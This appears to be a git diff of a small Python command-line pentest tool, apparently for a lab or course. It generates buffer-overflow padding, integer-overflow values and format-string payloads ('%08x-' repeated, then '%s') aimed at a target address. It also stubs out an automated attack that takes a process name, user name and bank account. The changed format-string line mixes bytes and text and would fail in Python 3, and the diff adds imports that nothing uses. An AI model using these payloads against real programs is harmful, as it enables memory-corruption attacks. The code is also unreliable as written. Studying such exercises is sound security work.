@@ -1,8 +1,10 @@
+from base64 import encode
 import re
+import struct
 import click
 import subprocess as sp
 
-import Exploitation.AutomatedPenTest as auto
+#import Exploitation.AutomatedPenTest as auto
 
 
 @click.group()
@@ -25,8 +27,8 @@ def automated_attack(process, user_name, bank_account):
         click.echo('incorrect format of the process name -> ' + process +', exiting now!')
         exit()
     
-    automated_attack = auto.AutomatedPenTest(process, user_name, bank_account)
-    automated_attack.begin_pen_test()
+    #automated_attack = auto.AutomatedPenTest(process, user_name, bank_account)
+    #automated_attack.begin_pen_test()
 
 
 @main.command()
@@ -37,7 +39,7 @@ def buffer_overflow(count = 32):
         eg. python3 ArmorPiercer.py buffer-overflow --count=10
     """
     attack_payload = 'a' * int(count)
-    click.echo(attack_payload.strip())
+    print(attack_payload.strip())
 
 @main.command()
 @click.option('--int-number',
@@ -51,9 +53,10 @@ def integer_overflow(int_number=-21474836100):
 @main.command()
 @click.option('--address',
                 help='Adress on which the string formating error should be performed')
-def string_formating(address = "\xc2\xd8\xff\xff"):
+def string_formating(address):
     """Command to perform string formating """
-    print(address+"%08x-"*3+"%s")
+    b = bytearray.fromhex(address)
+    print(b"%s" % b + "%08x-"*3 + "%s")
 
 if __name__ == '__main__':
     main()
